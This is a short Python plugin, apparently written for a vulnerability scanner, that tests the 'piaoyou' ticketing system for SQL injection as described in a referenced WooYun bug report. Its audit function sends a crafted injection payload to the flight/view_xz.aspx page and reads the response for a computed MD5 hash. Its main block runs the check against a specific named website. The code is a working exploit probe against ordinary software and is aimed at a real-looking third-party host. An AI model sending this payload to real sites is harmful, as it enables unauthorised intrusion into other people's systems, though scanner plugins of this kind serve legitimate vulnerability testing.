#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:票友系统一处通用SQL注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0128323
#Author:xq17

def assign(service, arg):
    if service == "piaoyou":
        return True, arg
                
def audit(arg): 
        url = arg + 'flight/view_xz.aspx?a=1+and+1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--'
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 500 or code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res :
            security_hole(arg + '  :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('piaoyou','http://www.iyoungsh.com/')[1])